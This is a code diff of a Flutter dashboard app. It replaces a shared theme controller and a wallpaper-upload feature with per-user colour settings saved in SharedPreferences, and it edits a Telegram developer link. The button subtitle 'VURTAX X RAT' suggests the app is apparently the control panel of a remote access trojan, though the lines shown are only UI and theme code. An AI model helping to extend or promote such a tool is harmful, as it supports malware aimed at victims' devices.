@@ -6,7 +6,6 @@ import 'dart:math' as math;
 import 'dart:math' show Random;
 import 'package:http/http.dart' as http;
 import 'package:flutter/material.dart';
-import 'app_theme.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:device_info_plus/device_info_plus.dart';
 import 'package:web_socket_channel/web_socket_channel.dart';
@@ -3322,7 +3321,7 @@ Widget _buildQuickActionsSection() {
       title: 'Chat Developer',
       subtitle: 'Developer VURTAX X RAT',
       gradient: [kRed, kBorder],
-      onTap: () => _openUrl('https://t.me/ranzz_offczaxx_stur'),
+      onTap: () => _openUrl('https://t.me/ranzz_offc'),
     ),
     _QuickActionData(
       icon: FontAwesomeIcons.bookQuran,
@@ -3713,13 +3712,13 @@ Widget _buildQuickActionsSection() {
   }
   
   Future<void> _loadDashboardTheme() async {
-    final saved = AppThemeController.current;
+    final prefs = await SharedPreferences.getInstance();
     if (!mounted) return;
     setState(() {
-      _selectedTheme = saved.name;
-      _themeBg = saved.background;
-      _themeCard = saved.card;
-      _themeAccent = saved.accent;
+      _selectedTheme = prefs.getString('dashboard_theme_$username') ?? 'Ocean';
+      _themeBg = Color(prefs.getInt('dashboard_bg_$username') ?? 0xFFDCEEFB);
+      _themeCard = Color(prefs.getInt('dashboard_card_$username') ?? 0xFFFFFFFF);
+      _themeAccent = Color(prefs.getInt('dashboard_accent_$username') ?? 0xFF1565C0);
       _customHue = HSVColor.fromColor(_themeAccent).hue;
     });
   }
@@ -3731,50 +3730,11 @@ Widget _buildQuickActionsSection() {
       _themeCard = card;
       _themeAccent = accent;
     });
-    await AppThemeController.setTheme(
-      name: name,
-      background: bg,
-      card: card,
-      accent: accent,
-    );
-  }
-
-  Future<void> _pickGlobalWallpaper() async {
-    try {
-      final picked = await ImagePicker().pickImage(
-        source: ImageSource.gallery,
-        imageQuality: 90,
-      );
-      if (picked == null) return;
-      final directory = await getApplicationDocumentsDirectory();
-      final extension = picked.path.contains('.')
-          ? picked.path.substring(picked.path.lastIndexOf('.'))
-          : '.jpg';
-      final saved = await File(picked.path).copy(
-        '${directory.path}/vurtax_wallpaper$extension',
-      );
-      await AppThemeController.setWallpaper(saved.path);
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          const SnackBar(content: Text('Wallpaper global berhasil diterapkan')),
-        );
-      }
-    } catch (e) {
-      if (mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text('Gagal memasang wallpaper: $e')),
-        );
-      }
-    }
-  }
-
-  Future<void> _removeGlobalWallpaper() async {
-    await AppThemeController.setWallpaper(null);
-    if (mounted) {
-      ScaffoldMessenger.of(context).showSnackBar(
-        const SnackBar(content: Text('Wallpaper global dihapus')),
-      );
-    }
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.setString('dashboard_theme_$username', name);
+    await prefs.setInt('dashboard_bg_$username', bg.value);
+    await prefs.setInt('dashboard_card_$username', card.value);
+    await prefs.setInt('dashboard_accent_$username', accent.value);
   }
 
   void _showThemeSettings() {
@@ -3838,25 +3798,6 @@ Widget _buildQuickActionsSection() {
                         );
                       },
                     ),
-                    const Divider(height: 24),
-                    Row(children: [
-                      const Icon(Icons.wallpaper_rounded),
-                      const SizedBox(width: 10),
-                      const Expanded(child: Text('Wallpaper seluruh aplikasi', style: TextStyle(fontWeight: FontWeight.w600))),
-                      TextButton.icon(
-                        onPressed: _pickGlobalWallpaper,
-                        icon: const Icon(Icons.upload_rounded),
-                        label: const Text('Upload'),
-                      ),
-                    ]),
-                    if (AppThemeController.current.wallpaperPath != null)
-                      Align(
-                        alignment: Alignment.centerRight,
-                        child: TextButton(
-                          onPressed: _removeGlobalWallpaper,
-                          child: const Text('Hapus wallpaper'),
-                        ),
-                      ),
                     const Divider(height: 28),
                     const Text('Kustom sendiri · pilih warna aksen', style: TextStyle(fontSize: 13, fontWeight: FontWeight.w600)),
                     const SizedBox(height: 8),
